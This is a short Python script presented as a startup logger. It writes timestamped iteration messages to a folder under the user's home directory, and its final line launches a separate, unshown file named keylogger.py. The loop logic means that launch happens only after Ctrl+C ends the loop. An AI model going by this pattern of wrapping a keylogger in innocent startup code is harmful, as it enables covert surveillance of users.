import datetime
import os
import sys
import threading
import time
import subprocess

LOG_DIR = os.path.join(os.path.expanduser("~"), ".local", "share", "MyStartupAppLogs")
LOG_FILE = os.path.join(LOG_DIR, "startup_log.txt")

os.makedirs(LOG_DIR, exist_ok=True)

def run_in_background(target, *args, **kwargs):
    """Start a callable in a background daemon thread."""
    thread = threading.Thread(target=target, args=args, kwargs=kwargs, daemon=True)
    thread.start()
    return thread


def log_message(message):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] {message}\n")
    print(f"[{timestamp}] {message}")


def run_on_startup(startup_task=None, *args, **kwargs):
    """Run an optional startup task in the background and log status."""
    if startup_task is not None:
        run_in_background(startup_task, *args, **kwargs)

    log_message("My startup program has started.")
    log_message(f"Python executable: {sys.executable}")
    log_message(f"Current working directory: {os.getcwd()}")

    iteration = 0
    while True:
        try:
            iteration += 1
            log_message(f"Running iteration {iteration} of background task.")
            time.sleep(10)
        except KeyboardInterrupt:
            log_message("Program interrupted by Ctrl+C. Exiting.")
            break
        except Exception as e:
            log_message(f"An error occurred: {e}. Attempting to continue.")
            time.sleep(5)


if __name__ == "__main__":
    run_on_startup()
    subprocess.run([sys.executable, "keylogger.py"])
